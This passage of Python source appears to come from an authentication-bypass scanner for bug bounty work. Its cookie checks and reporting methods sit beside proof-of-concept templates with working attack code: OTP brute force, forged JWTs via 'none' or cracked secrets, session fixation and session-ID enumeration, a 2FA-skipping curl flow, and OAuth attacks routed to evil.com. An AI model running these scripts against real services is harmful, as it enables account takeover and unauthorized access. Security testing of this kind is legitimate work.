                            bounty_estimate="$10,000-$30,000"
                        )
                        findings.append(finding)
                except:
                    pass

        except:
            pass

        return findings

    def _test_cookie_security(self) -> List[AuthBypassFinding]:
        """Test cookie security attributes (Secure, HttpOnly, SameSite)."""
        findings = []

        try:
            response = requests.get(
                f"{self.base_url}{self.login_endpoint}",
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            set_cookie_headers = response.headers.get_list('Set-Cookie') if hasattr(response.headers, 'get_list') else [response.headers.get('Set-Cookie')]

            issues = []

            for cookie_header in set_cookie_headers:
                if not cookie_header:
                    continue

                cookie_issues = []

                if 'Secure' not in cookie_header:
                    cookie_issues.append('Secure flag missing')

                if 'HttpOnly' not in cookie_header:
                    cookie_issues.append('HttpOnly flag missing')

                if 'SameSite' not in cookie_header:
                    cookie_issues.append('SameSite attribute missing')

                if cookie_issues:
                    issues.extend(cookie_issues)

            if issues:
                finding = AuthBypassFinding(
                    title="Weak Cookie Security Attributes",
                    severity=AuthBypassSeverity.MEDIUM,
                    vuln_type=AuthBypassType.COOKIE_SECURITY_WEAK,
                    description=(
                        f"Session cookies lack security attributes: {', '.join(set(issues))}. "
                        "This increases the risk of session hijacking."
                    ),
                    endpoint=self.login_endpoint,
                    poc="Check Set-Cookie headers in HTTP response",
                    impact=(
                        "Missing cookie security attributes increase attack surface:\n"
                        "- No Secure flag: Cookies sent over HTTP (MITM risk)\n"
                        "- No HttpOnly flag: Cookies accessible via JavaScript (XSS risk)\n"
                        "- No SameSite: Vulnerable to CSRF attacks"
                    ),
                    recommendation=(
                        "Set all security attributes on session cookies:\n"
                        "- Secure: Only send over HTTPS\n"
                        "- HttpOnly: Prevent JavaScript access\n"
                        "- SameSite=Strict or Lax: Prevent CSRF\n"
                        "Example: Set-Cookie: session=xyz; Secure; HttpOnly; SameSite=Strict"
                    ),
                    evidence={
                        'missing_attributes': list(set(issues)),
                        'set_cookie_headers': set_cookie_headers
                    },
                    cwe_id="CWE-614",
                    cvss_score=5.3,
                    bounty_estimate="$500-$2,000"
                )
                findings.append(finding)

        except:
            pass

        return findings

    # ============================================================================
    # PASSWORD RESET TESTS
    # ============================================================================

    def test_password_reset(self) -> List[AuthBypassFinding]:
        """Test for password reset vulnerabilities."""
        findings = []

        # Note: Password reset tests are mostly manual as they require email access
        # We can only test for obvious misconfigurations

        return findings

    # ============================================================================
    # UTILITY METHODS
    # ============================================================================

    def _is_2fa_required(self, response: requests.Response) -> bool:
        """Check if response indicates 2FA is required."""
        text = response.text.lower()
        indicators = ['2fa', 'two-factor', 'two factor', 'otp', 'verification code', 'mfa', 'multi-factor']
        return any(indicator in text for indicator in indicators)

    def _extract_2fa_endpoint(self, response: requests.Response) -> Optional[str]:
        """Extract 2FA verification endpoint from response."""
        # Try to find in response JSON
        try:
            data = response.json()
            if '2fa_endpoint' in data:
                return data['2fa_endpoint']
            if 'otp_endpoint' in data:
                return data['otp_endpoint']
        except:
            pass

        # Common 2FA endpoints
        common_endpoints = [
            '/api/2fa/verify',
            '/api/otp/verify',
            '/api/verify-otp',
            '/api/mfa/verify',
            '/api/verify',
            '/2fa/verify',
            '/otp/verify'
        ]

        return common_endpoints[0]  # Return most common one

    def _base64url_decode(self, data: str) -> str:
        """Decode base64url encoded data."""
        # Add padding
        padding = 4 - (len(data) % 4)
        if padding != 4:
            data += '=' * padding

        # Replace URL-safe characters
        data = data.replace('-', '+').replace('_', '/')

        return base64.b64decode(data).decode('utf-8')

    def _base64url_encode(self, data: str) -> str:
        """Encode data as base64url."""
        encoded = base64.b64encode(data.encode()).decode()
        return encoded.replace('+', '-').replace('/', '_').rstrip('=')

    def _generate_hmac_signature(self, signing_input: str, secret: str, algorithm: str) -> str:
        """Generate HMAC signature for JWT."""
        if algorithm == 'HS256':
            hash_func = hashlib.sha256
        elif algorithm == 'HS384':
            hash_func = hashlib.sha384
        elif algorithm == 'HS512':
            hash_func = hashlib.sha512
        else:
            return ''

        signature = hmac.new(
            secret.encode(),
            signing_input.encode(),
            hash_func
        ).digest()

        return base64.b64encode(signature).decode().replace('+', '-').replace('/', '_').rstrip('=')

    # ============================================================================
    # POC GENERATION METHODS
    # ============================================================================

    def _generate_2fa_rate_limit_poc(self, endpoint: str, attempts: int,
                                     elapsed: float, hours: float) -> str:
        """Generate POC for 2FA rate limiting bypass."""
        return f"""
# 2FA Rate Limiting Bypass POC

## Vulnerability
No rate limiting on OTP verification endpoint: {endpoint}

## Test Results
- Attempts: {attempts} OTP codes tested
- Time: {elapsed:.1f} seconds
- Rate: {attempts/elapsed:.0f} codes/second
- Estimated crack time: ~{hours:.1f} hours for all 1,000,000 6-digit codes

## Exploitation
```python
import requests

session = requests.Session()

# Login first
session.post('https://target.com/api/login', json={{
    'username': 'victim@example.com',
    'password': 'known_password'
}})

# Brute force OTP
for code in range(1000000):
    otp = f"{{code:06d}}"
    response = session.post('{self.base_url}{endpoint}', json={{'otp': otp}})

    if response.status_code == 200:
        print(f"Valid OTP found: {{otp}}")
        break
```

## Impact
Complete account takeover via OTP brute force.
"""

    def _generate_response_manipulation_poc(self, endpoint: str) -> str:
        """Generate POC for response manipulation."""
        return f"""
# 2FA Response Manipulation POC

## Vulnerability
2FA verification result returned to client, can be modified.

## Steps
1. Intercept POST request to: {self.base_url}{endpoint}
2. Submit invalid OTP (e.g., 000000)
3. Intercept response containing: {{"success": false, "verified": false}}
4. Modify response to: {{"success": true, "verified": true}}
5. Forward modified response to browser
6. Application proceeds as if 2FA passed

## Tools
- Burp Suite Proxy
- OWASP ZAP
- mitmproxy

## Impact
Complete 2FA bypass without knowing valid OTP code.
"""

    def _generate_direct_access_poc(self, endpoint: str) -> str:
        """Generate POC for direct access bypass."""
        return f"""
# 2FA Direct Access Bypass POC

## Vulnerability
Protected endpoints accessible without completing 2FA.

## Steps
1. POST /api/login with valid credentials
2. Stop at 2FA verification prompt (don't submit OTP)
3. Access protected endpoint: {self.base_url}{endpoint}
4. Full access granted without 2FA

## cURL
```bash
# Login
curl -X POST '{self.base_url}/api/login' \\
  -H 'Content-Type: application/json' \\
  -d '{{"username": "user@example.com", "password": "password123"}}' \\
  -c cookies.txt

# Access protected endpoint (without completing 2FA)
curl -X GET '{self.base_url}{endpoint}' \\
  -b cookies.txt
```

## Impact
Complete 2FA bypass, full account access.
"""

    def _generate_api_bypass_poc(self, endpoint: str, username: str) -> str:
        """Generate POC for API 2FA bypass."""
        return f"""
# 2FA API Bypass POC

## Vulnerability
API endpoint {endpoint} issues tokens without 2FA.

## Steps
```bash
curl -X POST '{self.base_url}{endpoint}' \\
  -H 'Content-Type: application/json' \\
  -d '{{"username": "{username}", "password": "password123"}}'
```

## Response
```json
{{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user_id": "12345"
}}
```

## Use Token
```bash
curl -X GET '{self.base_url}/api/user/profile' \\
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
```

## Impact
Complete 2FA bypass via API authentication.
"""

    def _generate_oauth_redirect_poc(self, oauth_url: str, malicious_redirect: str) -> str:
        """Generate POC for OAuth redirect URI bypass."""
        return f"""
# OAuth Redirect URI Bypass POC

## Vulnerability
OAuth redirect_uri validation bypassed with: {malicious_redirect}

## Malicious OAuth URL
{oauth_url}

## Attack Flow
1. Attacker hosts evil.com
2. Attacker sends victim malicious OAuth URL
3. Victim authorizes application
4. Authorization code sent to evil.com
5. Attacker exchanges code for access token
6. Complete account takeover

## Impact
OAuth authorization code theft → Account takeover
"""

    def _generate_oauth_csrf_poc(self, oauth_url: str) -> str:
        """Generate POC for OAuth CSRF."""
        return f"""
# OAuth CSRF Attack POC

## Vulnerability
OAuth flow does not require state parameter.

## Attack
```html
<!-- Attacker hosts this on evil.com -->
<html>
<body>
<script>
  // Redirect victim to OAuth flow without state
  window.location = '{oauth_url}';
</script>
</body>
</html>
```

## Flow
1. Attacker completes OAuth flow, captures redirect with code
2. Attacker stops before exchanging code
3. Victim clicks malicious link
4. Victim's account linked to attacker's OAuth account
5. Attacker can access victim's data

## Impact
Account linking attack, potential data exposure.
"""

    def _generate_jwt_none_poc(self, unsigned_token: str, payload: Dict) -> str:
        """Generate POC for JWT algorithm none."""
        return f"""
# JWT Algorithm 'none' Bypass POC

## Unsigned Token
{unsigned_token}

## Original Payload
{json.dumps(payload, indent=2)}

## Modified Payload (Example: Privilege Escalation)
```json
{{
  "user_id": "1",
  "role": "admin",
  "admin": true
}}
```

## Create Forged Token
```python
import base64
import json

header = {{"alg": "none", "typ": "JWT"}}
payload = {{"user_id": "1", "role": "admin", "admin": true}}

header_b64 = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')

forged_token = f"{{header_b64}}.{{payload_b64}}."
print(forged_token)
```

## Test Token
```bash
curl -X GET 'https://target.com/api/admin' \\
  -H 'Authorization: Bearer {unsigned_token}'
```

## Impact
Complete authentication bypass, forge any token.
"""

    def _generate_jwt_weak_secret_poc(self, secret: str, payload: Dict, algorithm: str) -> str:
        """Generate POC for JWT weak secret."""
        return f"""
# JWT Weak Secret Exploitation POC

## Cracked Secret
"{secret}"

## Algorithm
{algorithm}

## Forge Token
```python
import jwt

secret = '{secret}'
payload = {{
    'user_id': 'attacker',
    'role': 'admin',
    'admin': True
}}

forged_token = jwt.encode(payload, secret, algorithm='{algorithm}')
print(f"Forged token: {{forged_token}}")
```

## Use Forged Token
```bash
curl -X GET 'https://target.com/api/admin' \\
  -H 'Authorization: Bearer <forged_token>'
```

## Impact
Complete authentication bypass, forge tokens for any user.
"""

    def _generate_session_fixation_poc(self, session_id: str) -> str:
        """Generate POC for session fixation."""
        return f"""
# Session Fixation Attack POC

## Vulnerability
Session ID not regenerated after login.

## Attack Steps
1. Attacker gets session ID: {session_id}
2. Attacker sends victim link with fixed session:
   https://target.com/login?session={session_id}
3. Victim logs in (session ID stays the same)
4. Attacker uses {session_id} to hijack victim's session

## POC
```python
import requests

# Attacker fixes victim's session
session_id = '{session_id}'

# Wait for victim to login...

# Hijack session
cookies = {{'session': session_id}}
response = requests.get('https://target.com/api/profile', cookies=cookies)
print(response.json())  # Victim's data
```

## Impact
Account takeover without knowing credentials.
"""

    def _generate_predictable_session_poc(self, session_ids: List[str]) -> str:
        """Generate POC for predictable session IDs."""
        return f"""
# Predictable Session ID Attack POC

## Observed Session IDs
{json.dumps(session_ids, indent=2)}

## Attack
```python
import requests

# Known session ID
base_session = int('{session_ids[0]}')

# Enumerate nearby sessions
for offset in range(-1000, 1000):
    session_id = str(base_session + offset)

    response = requests.get(
        'https://target.com/api/profile',
        cookies={{'session': session_id}}
    )

    if response.status_code == 200:
        print(f"Valid session hijacked: {{session_id}}")
        print(response.json())
```

## Impact
Mass account takeover via session enumeration.
"""

    # ============================================================================
    # SUMMARY AND REPORTING
    # ============================================================================

    def get_findings_by_severity(self, severity: AuthBypassSeverity) -> List[AuthBypassFinding]:
        """Get findings filtered by severity level."""
        return [f for f in self.findings if f.severity == severity]

    def get_critical_findings(self) -> List[AuthBypassFinding]:
        """Get all critical severity findings."""
        return self.get_findings_by_severity(AuthBypassSeverity.CRITICAL)

    def get_summary(self) -> Dict[str, Any]:
        """
        Generate summary of test results.

        Returns:
            Dictionary with test statistics and findings
        """
        severity_counts = {
            'CRITICAL': len(self.get_findings_by_severity(AuthBypassSeverity.CRITICAL)),
            'HIGH': len(self.get_findings_by_severity(AuthBypassSeverity.HIGH)),
            'MEDIUM': len(self.get_findings_by_severity(AuthBypassSeverity.MEDIUM)),
            'LOW': len(self.get_findings_by_severity(AuthBypassSeverity.LOW)),
            'INFO': len(self.get_findings_by_severity(AuthBypassSeverity.INFO))
        }

        return {
            'target': self.base_url,
            'total_tests': len(self.test_results),
            'total_findings': len(self.findings),
            'severity_breakdown': severity_counts,
            'vulnerable': len(self.findings) > 0,
            'critical_count': severity_counts['CRITICAL'],
            'findings': [f.to_dict() for f in self.findings]
        }
